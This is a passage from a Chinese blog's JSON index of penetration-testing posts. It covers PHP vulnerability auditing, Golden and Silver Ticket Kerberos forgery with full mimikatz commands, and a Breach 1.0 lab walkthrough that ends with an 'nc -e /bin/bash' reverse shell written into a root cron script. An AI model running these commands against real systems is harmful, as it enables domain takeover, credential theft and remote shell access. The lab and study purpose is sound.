寻找xss漏洞的关键是寻找没有被过滤的参数，且参数传入到输出函数如print、print_r、echo、printf、die、var_dump等 ​ 漏洞防范： ​ 在输出和调用时通过HTML实体编码防止脚本注入 3、CSRF漏洞 ​ 针对CSRF漏洞，黑盒测试时，可以打开几个页面，抓包看看有没有token，去掉referer，如果返回的数据还是一样的就可能有漏洞。审计时，我们需要查看几个核心代码文件、被大量引用的文件有没有带验证token和referer的代码 ​ 漏洞防范： 增加token、referer验证 增加验证码 4、文件操作漏洞 ​ 文件操作漏洞又分为本地文件包含，远程文件包含。函数有：include()、include_once()、require()、require_once()。他们之间的区别在于：include()、include_once()在包含文件时即使遇到错误，下面的代码仍然会执行；…而require()、require_once()则会直接报错退出程序。 ​ 文件包含漏洞大多出现在模板加载，模块加载，cache调用等地方 ​ 本地文件包含（LFI）： ​ LFI是指仅能包含本机文件的包含漏洞，比如上传一个允许上传的文件格式的文件，再包含来执行代码， 包含PHP上传的临时文件、请求的URL或者UA内加入要执行的代码、webserver记录到日志后的日志等 等 ​ 远程文件包含（RFI）： ​ 需要设置allow_url_include = ON，我们就可以直接在相应的请求内传入一个其他网站下的文件。 ​ 文件包含截断： ​ 无法写入.php问件时 %00截断： 参数后面跟一个%00就可以绕过过滤。但是GPC开启的情况下，失去作用 .和/截断： windows下 在文件名最后加240个“.”或者“/”截断，在linux下需要2038个/.组合才能截断（PHP5.3之前） ?截断：在url请求包含的文件最后添加？让server以为？后的内容是请求参数，如/1.txt? 因为在http内2.txt和2.txt?.php的访问结果是一样的 ​ 文件上传漏洞 ​ 在寻找文件上传漏洞时最好的是直接搜索move_uploaded_file()函数，再查看调用这个函数的相关函数 是否存在对上传文件的格式限制或是能不能被绕过。 ​ 较常见是未曾设置文件格式限制、黑名单扩展名绕过、文件头/content-type绕过 ​ 漏洞防范： ​ 文件操作漏洞有几个共同点如下： ​ (1): 由越权操作引起的可以操作未授权操作的文件 ​ (2): 要操作更多的文件需要跳转目录 ​ (3): 大多是在请求中传入文件名 ​ 针对这些特点： ​ (1): 对权限的管理要合理。比如A用户上传的文件，其他平行权限的用户未授权时不能查看，特殊文件只 有特权用户才能查看，对文件的操作比如删除等只有管理员才能操作。 ​ (2): 有的文件操作是不需要传入文件名的，比如下载文件时，文件是已知的，我们可以使用参数来代替 文件名作为下载需要的参数。 ​ (3): 避免目录跳转问题，主要是通过对传入参数中的’…‘和’/‘以及’\\'检查。 ​ (4): 针对文件上传，我们使用白名单的方式过滤扩展名。保存上传文件时，重命名文件比如用MD5值代 替。 5、代码执行 ​ 由于程序本身过滤不严，用户可以直接通过请求将代码注入到应用中去执行。类似SQL注入漏洞代码会在SQL服务执行。最终注入的代码会在web server中执行。 代码执行函数： 123456789101112131415eval 和 assert: 执行PHP代码preg_replace: perg_replace(a,b,c):在C中找到a， 用b替代。若b的末尾存在/e修饰，则会被当做代码执行call_user_func和array_map： call_user_func(a,b,c...):a表示要调用的函数，后面的表示a需要的参数动态函数执行： 为了方便函数调用程序员自己定义的由字符串拼接成的函数thinkphp代码执行： GET参数以index.php/a/b/c的形式传递 造成原因是PHP中&quot; &quot;内的内容会被直接当做命令执行 ​ 漏洞防范： ​ 使用参数白名单过滤，结合正则表达式来进行白名单过滤。 6、命令执行 ​ 命令执行漏洞主要出现在包含环境包的应用里，一些直接在系统安装就可以启动自带的web服务和数据库服务，web应用会有比较多的点之间使用system(); exec(); shell_exec(); passthru(); popen(); proc_open()等函数执行命令调用一些需要的脚本。 ​ 漏洞防范： ​ 在命令上的防注入函数有：escapeshellcmd()和escapeshellarg()，前者是过滤整个命令，后者是过滤传入的参数。还有就是参数白名单。 7、变量覆盖漏洞 ​ 利用我们自定义的参数来代替程序原有的变量值，结合程序的其他功能来实现攻击。常常是由于函数使用不当造成的，容易引发变量覆盖漏洞的函数有：extract()和parse_str()，而import_request_variables()函数主要是因为在没有开启全局变量注册的时候，调用了这个函数则相当于开启了全局注册变量，在PHP4.5之后这个函数被取消，另外还利用$$的方式注册变量没有去验证已有变量而导致的变量覆盖。 ​ 寻找变量覆盖漏洞，首先要考虑能不否实现变量覆盖，即使可以实现，后续变量能不能被利用，在审计时可以直接寻找参数带变量的extract()和parse_str()函数和“$$”。 函数使用不当： extract()函数通过从数组中将变量导入到当前符号表，即将数组中的键值对注册成为变量。函数有三个参数其中能不能导致变量覆盖由第二个参数决定：函数能不能产生变量覆盖要看第二个参数extract_type,若为EXTR_OVERWRITE则覆盖变量；若只传入第一个变量的值则默认同上；若为EXTR_IF_EXISTS同上。 parse_str函数的是解析字符床并注册成为变量，在注册前不会验证变量是否存在，会直接覆盖掉原有的变量。两个参数a,b经过函数处理后，a里的键值对如a=1，会被处理成a=1,并放进b数组中，若数组中有a = 1,并放进b数组中，若数组中有a=1,并放进b数组中，若数组中有a=2之类，则覆盖。 $$变量覆盖： ​ 漏洞防范： ​ (1): 使用原始变量，常见的变量覆盖漏洞都是在变量注册的时候产生的，因此就不进行变量注册，仅使用原生的变量进行操作，必要的时候可以在代码中直接定义变量，再把请求中的值赋给他。 ​ (2): 验证变量存在，注册前先判断变量是不是存在，最重要的一点，自行申明的变量一定要初始化，不然即使注册变量代码在执行流程的最前面也会覆盖掉未初始化的变量。","categories":[],"tags":[{"name":"渗透测试学习","slug":"渗透测试学习","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"}]},{"title":"金银票据","slug":"金银票据","date":"2021-09-18T03:08:53.000Z","updated":"2021-09-18T11:54:42.851Z","comments":true,"path":"2021/09/18/金银票据/","link":"","permalink":"http://example.com/2021/09/18/%E9%87%91%E9%93%B6%E7%A5%A8%E6%8D%AE/","excerpt":"","text":"简介 关于黄金票据和白银票据的相关知识。 原理 先看金银票据的定义： 123黄金票据(Ticket-Granting-Ticket)：是直接抓取域控中ktbtgt账号的hash，来在client端生成一个TGT票据，那么该票据是针对所有机器的所有服务。白银票据(Silver Ticket)：抓取到了域控服务hash的情况下，在client端以一个普通域用户的身份生成TGS票据，是针对于某个机器上的某个服务的，生成的白银票据,只能访问指定的target机器中指定的服务。 总而言之，黄金票据就是伪造krbtgt用户的TGT票据，krbtgt用户是域控中用来管理发放票据的用户，拥有了该用户的权限，就可以伪造系统中的任意用户，针对域内的所有用户。而白银票据则是伪造ST（门票），这样的好处是门票不会经过KDC，从而更加隐蔽，但是伪造的门票只对部分服务起作用,如cifs（文件共享服务），mssql，winrm（windows远程管理），DNS等等 其中一些定义，接下来我们一一介绍： 123456krbtgt用户: krbtgt用户是域控中用来管理发放票据的用户，拥有了该用户的权限，就可以伪造系统中的任意用户TGT(Ticket-Granting-Ticket): 黄金票据ST(Silver Ticket): 白银票据Client: Application Client: 应用客户端TGS: Ticket-Granting Service: 用来授权服务访问KDC: Key Distribution Center: 秘钥分发中心 关于Kerberos协议 大致流程如下： Client向KDC发起AS_REQ请求内容为通过Client密码Hash 加密的时间戳、ClientID、网络地址、加密类型等内容 KDC使用Client hash进行解密，并在ntds.dit(只有域控中才有的数据库)中查找该账户，如果结果正确就返回用krbtgt NTLM-hash加密的TGT票据，TGT里面包含PAC（Privilege Attribute Certificate，不同的账号有不同的权限，PAC就是为了区别不同权限的一种方式），PAC包含Client的sid，Client所在的组 Client(客户端)凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求 KDC使用krbtgt NTLM-hash进行解密，如果结果正确，就返回用服务NTLM-hash 加密的TGS票据，并带上PAC返回给Client(客户端)，这一步不管用户有没有访问服务的权限，只要TGT（认证票据）正确，就返回TGS票据 此时client拿着KDC给的TGS票据去请求服务 服务端使用自己的NTLM-hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限 详细过程如下： 用户登录： 用户登录阶段，通常由用户输入[用户名]和[密码]信息，客户端将用户输入的[密码]信息通过一个 单向Hash函数生成一个[Client密钥] 请求身份认证： (1)：客户端为执行登录操作的用户向AS(Authentication Server 用来认证用户身份)发送认证请求，附 带用户信息。 (2)：AS收到用户认证请求之后，根据请求中的[用户名]信息，从数据库中查找该用户名是否存在。 如果[用户名]存在，则对应的[密码]也可以从数据库中获取到。AS利用相同的单向Hash函数为[密 码]生成一个秘钥，如果第1步中用户提供的[密码]信息正确，该秘钥与用户登录章节中的[Client密 钥]相同： ​ 此时返回响应消息： ​ Msg A 使用[Client密钥]加密的[Client/TGS SessionKey] Msg B 使用[TGS密钥]加密的TGT(Ticket-Granting-Ticket)，因此该消息Client不可解析。 TGT中包含如下信息： 1234[Client/TGS SessionKey]Client IDTicket有效时间Client网络地址 Client收到AS的响应消息以后，利用自身的[Client密钥]可以对Msg A进行解密，这样可以获取到 [Client/TGS SessionKey]。但由于Msg B是使用[TGS密钥]加密的，Client无法对其解密。 请求服务授权 (1): 客户端向TGS发送请求，请求授权。 包含两个信息： ​ Msg C：要请求的服务ID, 即[Service ID]；上一步2.2中由AS为Client提供的TGT。 Msg D：使用[Client/TGS SessionKey]加密的Authenticator 1 {Client ID, Timestamp}。 (2): TGS为Client响应服务授权票据 ​ TGS为Client响应的消息包括： ​ Msg E 使用[Service密钥]加密的Client-To-Server Ticket, 该Ticket中包含了如下信息: 1234[Client/Server SessionKey]Client网络地址Ticket有效时间Client IDMsg F 使用[Client/TGS SessionKey]加密的[Client/Server SessionKey]。 ​ Msg F 使用[Client/TGS SessionKey]加密的[Client/Server SessionKey]。 注意： Msg E使用了[Service密钥]加密，该消息可视作是TGS给Service Server的消息，只不过由Client 一起携带。 Msg F使用了[Client/TGS SessionKey]加密，因此，该消息对Client可见。Client对其解密以后可 获取到[Client/Server SessionKey]。 发送服务请求 (1): Client向SS(Service Server)发送服务请求 发送的消息中包括： Msg E 上一步3.2中，TGS为Client响应的消息Msg E。该消息可以理解为由Client为SS携带的消息。 Msg G 由[Client/Server SessionKey]加密的Authenticator 2，包含{Client ID, Timestamp}信息。这里的Authenticator 2区别于前面3.1步骤中的Authenticator 1。 注意： [Client/Server SessionKey]并未直接透明传输，而是被包含在使用[Service密钥]加密的Msg E中。 既然[Client/Server SessionKey]并不直接透明传输， Client需要向SS证明自己拥有正确的[Client/Server SessionKey]，所以，Authenticator 2使用了[Client/Server SessionKey]加密。 (2): SS响应Client SS收到客户端的服务请求之后，先利用自身的[Service密钥]对Msg E进行解密，提取出Client-To-Server Ticket, 在3.2步骤中，提到了该Ticket中包含了[Client/Server SessionKey]以及Client ID信息。 SS使用[Client/Server SessionKey]解密Msg G，提取Client ID信息，而后将该Client ID与Client-To-Server Ticket中的Client ID进行比对，如果匹配则说明Client拥有正确的[Client/Server SessionKey]。 而后，SS向Client响应Msg H(包含使用[Client/Server SessionKey]加密的Timestamp信息)。 Client收到SS的响应消息Msg H之后，再使用[Client/Server SessionKey]对其解密，提取Timestamp信息，然后确认该信息与Client发送的Authenticator 2中的Timestamp信息一致。 利用 黄金票据（Golden Ticket） 前提： ​ 拿到域控 ​ 有krbtgt用户的hash值（借助mimikatzkatz） 要求： ​ 域名 ​ 域的SID 值 ​ 域的KRBTGT账户NTLM密码哈希 ​ 伪造用户名 12345678910111213141516171819# 获取域名whoaminet time /domainipconfig /all # 获取SIDwhoami /all# 获取域的KRBTGT账户NTLM密码哈希或者aes-256值lsadump::dcsync /domain:zz.com /user:krbtgt /csv# 伪造管理员用户名net group &quot;domain admins&quot;# 清除所有票据klist purge# 使用mimikatz伪造指定用户的票据并注入到内存kerberos::golden /admin:administrator /domain:zz.com /sid:S-1-5-21-1373374443-4003574425-2823219550 /krbtgt:9f3af6256e86408cb31169871fb36e60 /ptt 白银票据 利用前提： 拿到目标机器hash(是目标机,不一定是域控) 条件要求： 域名 域sid 目标服务器FQDN 可利用的服务 服务账号的NTML HASH 需要伪造的用户名 123456789101112131415161718192021222324252627282930# 获取域名whoaminet time /domainipconfig /all # 获取SIDwhoami /all# 目标机器的hostname+域名 /target:\\\\\\\\WIN-75NA0949GFB.NOONE.comnet time /domain # 可利用的服务CIFS(磁盘共享的服务) /service:CIFS # 要伪造的用户名 /user:Administrator # 服务账号的ntlm hash(Primary Username : WIN-75NA0949GFB$带$的hash，不是admin的) /rc4:08d93ddf15a6309a46daaa7ec8565296# 利用文件共享服务cifs，获取服务账号(域控名)得NTMLhash值(在14068基础上使用mimikatz获取)mimikatz.exe privilege::debug sekurlsa::logonpasswords exit &gt;&gt; 2.txt# 清除所有票据klist purge# 使用mimikatz伪造指定用户的票据并注入到内存kerberos::golden /domain:域名 /sid:填sid /target:完整的域控名 /service:cifs /rc4:服务账号NTMLHASH /user:用户名 /ptt 防御 （1）限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组。这大大降低了攻击者访问域控制器的Active Directory的ntds.dit。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码 （2）禁用KRBTGT帐户，并保存当前的密码以及以前的密码。KRBTGT密码哈希用于在Kerberos票据上签署PAC并对TGT（身份验证票据）进行加密。如果使用不同的密钥（密码）对证书进行签名和加密，则DC（KDC）通过检查KRBTGT以前的密码来验证 （3）建议定期更改KRBTGT密码（毕竟这是一个管理员帐户）。更改一次，然后让AD备份，并在12到24小时后再次更改它。这个过程应该对系统环境没有影响。这个过程应该是确保KRBTGT密码每年至少更改一次的标准方法 （4）一旦攻击者获得了KRBTGT帐号密码哈希的访问权限，就可以随意创建黄金票据。通过快速更改KRBTGT密码两次，使任何现有的黄金票据（以及所有活动的Kerberos票据）失效。这将使所有Kerberos票据无效，并消除攻击者使用其KRBTGT创建有效金票的能力","categories":[],"tags":[{"name":"域渗透","slug":"域渗透","permalink":"http://example.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"}]},{"title":"breach1靶场渗透（二）","slug":"breach1靶场渗透（二）","date":"2021-09-17T05:05:38.000Z","updated":"2021-09-17T07:31:21.222Z","comments":true,"path":"2021/09/17/breach1靶场渗透（二）/","link":"","permalink":"http://example.com/2021/09/17/breach1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"","text":"紧接上一回，看看过滤后的记录，找到一条链接： 打开网页看看，并不能正确响应，看到地址栏提示不安全？ https为何提示不安全？证书过期了么？ 换个火狐浏览器打开试试看，提示是不安全的连接。可能是浏览器认为证书过期。尝试使用burp做个转发（就是加个burp代理，拦截再放过请求包。）因为burp的证书是受信任的： OK，新的页面，新的希望。一个HTTP basic 验证。回到鲨鱼，往下再看看记录。在第三条找到了basic关键字： 尝试解码看看： 获取到一组用户密码： 1tomcat:Tt\\5D8F(#!*u=G)4m7zB 登录看看，一个tomcat的后台： 看到文件上传的位置： 使用msf生成一个反弹shell的马： 同时开启监听： 将生成好的文件上传并且访问： 回到msf看到shell: 尝试获取交互shell： 1python -c &#x27;import pty;pty. spawn(&quot;/bin/bash&quot;)&#x27; 看看内核版本： 1uname -a 看到版本是Linux Breach 4.2.0-27-generic msf里看看有没有可以利用的漏洞。结果并没有 那就看看有没有什么敏感文件： 1ls -a 1cat /etc/passwd 1find / -name 读取到/etc/passwd文件： 逐级查看目录，在www目录下看到两个文件，打开5446文件，莫名的php文件 打开查看，是数据库的账号密码文件，账号是root,密码是空。 连接数据库： 在user表内找打了账号，密码信息： 对milton的密码解密（哈希值）： 切换用户： 再重复之前的操作，查看文件，看看历史执行，看看能不能root执行什么，结果并没有。在历史命令里我们看到切换到了blubergh账号，但是我们并没有找到他的密码？ 只能回过头去看，慢慢寻找。想起之前目录扫描时的图片目录，把所有的图片下载下来，strings 或者exiftool看看照片有没有注释。 [](https://imgtu.com/i/4KDmCR 尝试切换，确实是密码，看看权限： 两个文件能以root身份执行，其中tidyup是用来隔一段时间删除tomcat上传的文件用来防止黑客 另一个文件tee: 如此，我们可以利用第一个命令向第二个文件内写入一个定时任务，第二个文件每三分钟执行一次: 123echo &quot;nc -e /bin/bash 192.168.110.129 5555&quot; &gt; shell.txtcat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh 随后我们在msf机器开启监听： 1nc -lvvp 5555 等待一段时间： 结束。","categories":[],"tags":[{"name":"breach 渗透测试","slug":"breach-渗透测试","permalink":"http://example.com/tags/breach-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"breach1靶场渗透","slug":"breach1靶场渗透","date":"2021-09-16T16:25:49.000Z","updated":"2021-09-16T16:32:09.171Z","comments":true,"path":"2021/09/17/breach1靶场渗透/","link":"","permalink":"http://example.com/2021/09/17/breach1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/","excerpt":"","text":"靶场搭建 下载好breach1.0镜像文件后，创建虚拟机，注意要将虚拟机网段设置成仅主机模式。网段设置为192.168.110.0，虚拟机会默认将ip设置为192.168.110.140。 测试： 因为IP已知，首先对靶场进行端口扫描，借助nmap: 1nmap -p 1-65535 192.168.110.140 扫描后看到结果，所有的端口都是打开状态，因此判断可能是采用了ips，或者waf防护 尝试在浏览器中访问靶机IP，看到一些没啥用的信息（讲故事） 尝试看看源码？也就这样了。看到一段加密过的值 1&lt;!------Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo -----&gt; 这段值是64位，根据常见的加密算法的特征，猜测是base64加密。 （md5:32位，sha1：40位）尝试用自动解码工具解码看看，果然是base64，但还是看不懂，难道加了盐？再试一次，能看懂了。 解码出现： 1pgibbons:damnitfeel$goodtobeagang$ta 猜测是某个用户账号密码 回到原来的初始页面，点击图片，进入一个类似导航的页面： 依次点点看 ，再最后一个链接，进入了一个后台直接看到是什么cms ，后面可以查询看看这个impress cms 有没有什么漏洞 用之前的密码试试看？果然进入： 先看看cms是不是有什么漏洞。msf打开： 1searchsploit impresscms 有是有就是不知道这里具体的版本： 依次尝试，并不行。。。 继续看看页面上有啥，这里有三个未读邮件，进去看看 第三封邮件有信息，在 192.168.110.140/.keystore 位置保存了文件 keystore是keytool（jdk里自带）生成的密钥、证书存储的地方，这里有什么关键的信息？可以用keytool提取java里的密钥、证书。不管别的，先下载这个keystore。但是没有密钥口令也没法解开。 继续寻找密钥，点点点，在View Account内有个一content链接打开看看？ 看看提示，有个文件： http://192.168.110.140/impresscms/_SSL_test_phase1.pcap。pcap文件？什么玩意？搜搜看，原来是wireshark的流量包，下了再说。继续看，生成keystore需要的别名，密钥都是“tomcat”。在下载keystore的目录下，使用keytool生成证书： 1keytool -importkeystore -srckeystore E:\\Download\\keystore -destkeystore E:\\Download\\\\tomcat.p12 -deststoretype PKCS12 -srcalias tomcat 密钥库口令就是tomcat。可以看到tomcat.p12证书生成。 打开SSL_test_phase1.pcap文件，https协议，用了TSL加密，因此导入刚刚生成的证书来解密。 编辑–&gt;首选项–&gt;Protocols–&gt;TLS–&gt;edit 回到wireshark主页面，过滤一下信息： 1ip.src == 192.168.110.140 || ip.dst == 192.168.110.140 and http","categories":[],"tags":[{"name":"breach1.0 渗透测试","slug":"breach1-0-渗透测试","permalink":"http://example.com/tags/breach1-0-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"myfirstblog","slug":"myfirstblog","date":"2021-09-15T12:00:35.000Z","updated":"2021-09-16T16:21:24.360Z","comments":true,"path":"2021/09/15/myfirstblog/","link":"","permalink":"http://example.com/2021/09/15/myfirstblog/","excerpt":"","text":"我的博客，分享渗透测试学习的点点滴滴","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"java反序列化","slug":"java反序列化","permalink":"http://example.com/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"sqlmap-api","slug":"sqlmap-api","permalink":"http://example.com/tags/sqlmap-api/"},{"name":"sqlmap api","slug":"sqlmap-api","permalink":"http://example.com/tags/sqlmap-api/"},{"name":"xss 渗透测试","slug":"xss-渗透测试","permalink":"http://example.com/tags/xss-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"渗透测试学习","slug":"渗透测试学习","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"},{"name":"域渗透","slug":"域渗透","permalink":"http://example.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"},{"name":"breach 渗透测试","slug":"breach-渗透测试","permalink":"http://example.com/tags/breach-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"breach1.0 渗透测试","slug":"breach1-0-渗透测试","permalink":"http://example.com/tags/breach1-0-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]}